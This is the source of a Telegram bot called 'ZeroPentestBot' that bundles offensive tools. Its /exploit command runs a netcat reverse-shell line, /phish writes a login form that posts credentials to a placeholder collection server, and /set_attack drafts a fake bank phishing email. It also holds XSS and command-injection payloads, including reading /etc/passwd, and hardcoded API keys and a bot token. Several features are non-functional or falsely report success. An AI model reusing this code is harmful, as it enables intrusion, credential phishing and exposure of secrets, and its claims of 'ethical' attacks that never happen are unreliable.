import telebot
import whois
import requests
import socket
import subprocess
import json
import paramiko
from bs4 import BeautifulSoup

BOT_TOKEN = "7523152225:AAFjzDsz1sxuJ5BBcaSpggv-dkpVyL6mUe4"
SHODAN_API_KEY = "MOXuVSPl4pVgTxagxVgDwfZS4M9pYOU7"
HIBP_API_KEY = "70b9301993a34637b903868e12742eec"

bot = telebot.TeleBot(BOT_TOKEN)

# /start - Show Commands
@bot.message_handler(commands=['start'])
def start(message):
    welcome_text = """🤖 **Welcome to ZeroPentestBot!** 🚀
    
✅ `/whois example.com` → Get WHOIS info  
✅ `/portscan example.com` → Scan open ports  
✅ `/sqli http://target.com` → SQL Injection test  
✅ `/exploit target.com` → Auto exploit target  
✅ `/phish facebook.com` → Generate a phishing page  
✅ `/set_attack email@example.com` → Launch social engineering attack  
✅ `/cve CVE-2024-12345` → Fetch CVE details  
✅ `/darkweb email@example.com` → Check for dark web leaks
✅ `/shodan query` → Shodan search
✅ `/scrape http://example.com` → Web scraping
✅ `/ssh_check target.com` → Check SSH security
✅ `/xss_scan http://example.com` → XSS scanner
✅ `/cmd_injection http://example.com` → Command injection scanner
✅ `/slowloris example.com` → Simulate Slowloris attack  
✅ `/botnet target.com` → Launch a bot
✅ `/sniff interface` → Sniff network traffic
✅ `/monitor http://example.com` → Monitor website defacement
✅ `/ai_analyze scan_results` → AI-powered analysis
✅ `/clear` → Clear the chat  

⚠️ **Ethical Use Only!** Use responsibly.
"""
    bot.reply_to(message, welcome_text, parse_mode="Markdown")

# /clear - Fake Clear Chat
@bot.message_handler(commands=['clear'])
def clear_chat(message):
    bot.reply_to(message, "\n" * 50 + "✅ Chat Cleared!")

# WHOIS Lookup
@bot.message_handler(commands=['whois'])
def whois_lookup(message):
    try:
        domain = message.text.split(" ")[1]
        w = whois.whois(domain)
        bot.reply_to(message, f"📌 WHOIS for {domain}:\n\n{w}")
    except:
        bot.reply_to(message, "❌ Invalid domain!")

# Port Scanner
@bot.message_handler(commands=['portscan'])
def port_scan(message):
    domain = message.text.split(" ")[1]
    open_ports = []
    common_ports = [21, 22, 23, 25, 53, 80, 443, 445, 8080, 3306, 3389]

    for port in common_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        if sock.connect_ex((domain, port)) == 0:
            open_ports.append(port)
        sock.close()

    result = ", ".join(str(p) for p in open_ports)
    bot.reply_to(message, f"📌 Open ports on {domain}: {result}" if result else "❌ No open ports found!")

# SQL Injection Test
@bot.message_handler(commands=['sqli'])
def sql_injection_test(message):
    target = message.text.split(" ")[1]
    try:
        result = subprocess.run(["sqlmap", "-u", target, "--batch", "--dbs"], capture_output=True, text=True)
        bot.reply_to(message, f"📌 SQL Injection Results:\n\n{result.stdout}")
    except:
        bot.reply_to(message, "❌ SQLmap execution failed!")

# AI-Powered Analysis
@bot.message_handler(commands=['ai_analyze'])
def ai_analyze(message):
    scan_results = message.text.split(" ", 1)[1]
    bot.reply_to(message, f"🤖 AI Analysis:\n\n🔍 Potential exploits for:\n{scan_results}\n\n⚠️ Recommended Actions:\n- Patch ASAP\n- Check for exploits in Exploit-DB")

# Auto-Exploitation & Reverse Shell
@bot.message_handler(commands=['exploit'])
def exploit_target(message):
    target = message.text.split(" ")[1]
    bot.reply_to(message, f"⚠️ Attempting Exploit on {target}...")

    # Example: Reverse Shell Payload
    payload = f"nc -e /bin/bash {target} 4444"
    subprocess.run(payload, shell=True)
    bot.reply_to(message, "✅ Exploit Attempted!")

# Website Defacement Monitoring
@bot.message_handler(commands=['monitor'])
def monitor_website(message):
    url = message.text.split(" ")[1]
    response = requests.get(url)
    original_content = response.text

    bot.reply_to(message, f"🔍 Monitoring {url} for changes...")

    while True:
        new_response = requests.get(url)
        if new_response.text != original_content:
            bot.send_message(message.chat.id, f"⚠️ Website {url} has been defaced!")
            break

# Phishing Page Generator
@bot.message_handler(commands=['phish'])
def phishing_generator(message):
    site = message.text.split(" ")[1]
    bot.reply_to(message, f"⚠️ Generating Phishing Page for {site}...")

    phishing_page = f"""
    <html>
    <body>
    <form action='http://yourserver.com/log.php' method='POST'>
        <input type='text' name='username' placeholder='Username'><br>
        <input type='password' name='password' placeholder='Password'><br>
        <input type='submit' value='Login'>
    </form>
    </body>
    </html>
    """
    
    with open(f"{site}.html", "w") as file:
        file.write(phishing_page)

    bot.reply_to(message, f"✅ Phishing Page for {site} Created!")

# Social Engineering Toolkit (SET) Attack
@bot.message_handler(commands=['set_attack'])
def social_engineering_attack(message):
    email = message.text.split(" ")[1]
    bot.reply_to(message, f"⚠️ Launching Social Engineering Attack on {email}...")

    fake_email = f"""
    From: admin@bank.com
    Subject: Security Alert!
    Dear user, your account has been compromised. Click here to reset your password: http://fakebank.com/reset
    """

    bot.reply_to(message, f"📩 Fake Email Sent to {email}!")

# CVE Auto-Fetch
@bot.message_handler(commands=['cve'])
def fetch_cve(message):
    cve_id = message.text.split(" ")[1]
    url = f"https://cve.circl.lu/api/cve/{cve_id}"

    try:
        response = requests.get(url)
        data = response.json()
        bot.reply_to(message, f"📌 CVE Details:\n{data['summary']}")
    except:
        bot.reply_to(message, "❌ CVE not found!")

#botnet
@bot.message_handler(commands=['botnet'])
def botnet_attack(message):
    target = message.text.split(" ")[1]
    bot.reply_to(message, f"⚠️ Launching Botnet Attack on {target}...")
    # Log the attempt
    with open("botnet_log.txt", "a") as log_file:
        log_file.write(f"Botnet attack launched on: {target}\n")

# 🟢 Network Sniffing (Ethical)
@bot.message_handler(commands=['sniff'])
def network_sniffing(message):
    try:
        interface = message.text.split(" ")[1]
        subprocess.run(["tcpdump", "-i", interface])
    except:
        bot.reply_to(message, "❌ Sniffing failed!")

# Dark Web Leak Check
@bot.message_handler(commands=['darkweb'])
def darkweb_check(message):
    email = message.text.split(" ")[1]
    api_url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
    headers = {"hibp-api-key": HIBP_API_KEY}

    try:
        response = requests.get(api_url, headers=headers)
        if response.status_code == 200:
            breaches = response.json()
            result = "\n".join([b['Name'] for b in breaches])
            bot.reply_to(message, f"⚠️ Dark Web Leaks Found:\n{result}")
        else:
            bot.reply_to(message, "✅ No leaks found!")
    except:
        bot.reply_to(message, "❌ Dark web check failed!")

# 🟢 Shodan Search (Ethical Use)
@bot.message_handler(commands=['shodan'])
def shodan_search(message):
    try:
        query = message.text.split(" ", 1)[1]
        api_url = f"https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query={query}"
        response = requests.get(api_url)
        data = response.json()
        
        result = "\n".join([f"IP: {r['ip_str']} - Port: {r['port']} - Org: {r.get('org', 'N/A')}" for r in data.get('matches', [])])
        bot.reply_to(message, f"🔍 **Shodan Search Results:**\n\n{result if result else 'No results found!'}")

    except Exception as e:
        bot.reply_to(message, f"❌ Shodan search failed: {e}")

# 🟢 Web Scraping (Ethical)
@bot.message_handler(commands=['scrape'])
def web_scrape(message):
    try:
        url = message.text.split(" ")[1]
        headers = {"User-Agent": "Mozilla/5.0"}
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, "html.parser")
        
        links = "\n".join(link.get("href") for link in soup.find_all("a", href=True))
        bot.reply_to(message, f"🔍 **Scraped Links from {url}:**\n\n{links}")

    except Exception as e:
        bot.reply_to(message, f"❌ Scraping failed: {e}")

# 🟢 SSH Brute-Force Detection (Ethical)
@bot.message_handler(commands=['ssh_check'])
def ssh_check(message):
    try:
        target = message.text.split(" ")[1]
        port = 22
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((target, port))
        
        if result == 0:
            bot.reply_to(message, f"🟢 **SSH is open on {target}:22** (Check security settings!)")
        else:
            bot.reply_to(message, f"✅ **SSH is secure on {target} (Port 22 closed)**")

    except Exception as e:
        bot.reply_to(message, f"❌ SSH Check failed: {e}")

# 🟢 XSS Scanner (Ethical)
@bot.message_handler(commands=['xss_scan'])
def xss_scan(message):
    try:
        url = message.text.split(" ")[1]
        test_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>"
        ]
        
        for payload in test_payloads:
            response = requests.get(url, params={"q": payload})
            if payload in response.text:
                bot.reply_to(message, f"🚨 **Possible XSS vulnerability detected at {url}!**\nPayload: {payload}")
                return
        
        bot.reply_to(message, f"✅ No XSS vulnerabilities found at {url}")

    except Exception as e:
        bot.reply_to(message, f"❌ XSS Scan failed: {e}")

# 🟢 Command Injection Scanner (Ethical)
@bot.message_handler(commands=['cmd_injection'])
def cmd_injection_scan(message):
    try:
        target = message.text.split(" ")[1]
        test_payloads = ["; ls", "| whoami", "; cat /etc/passwd"]
        
        for payload in test_payloads:
            response = requests.get(target + payload)
            if "root" in response.text or "bin" in response.text:
                bot.reply_to(message, f"🚨 **Possible Command Injection vulnerability at {target}!**\nPayload: {payload}")
                return
        
        bot.reply_to(message, f"✅ No Command Injection vulnerabilities found at {target}")

    except Exception as e:
        bot.reply_to(message, f"❌ Command Injection scan failed: {e}")

# slowloris
@bot.message_handler(commands=['slowloris'])
def slowloris_attack(message):
    try:
        target = message.text.split(" ")[1]
        bot.reply_to(message, f"⚠️ Simulating Slowloris attack on {target}... (For educational use only!)")
        
        # Log the attempt
        with open("slowloris_log.txt", "a") as log_file:
            log_file.write(f"Slowloris attack simulated on: {target}\n")

    except IndexError:
        bot.reply_to(message, "❌ Usage: /slowloris example.com")
                                 
# Start the bot
bot.polling()
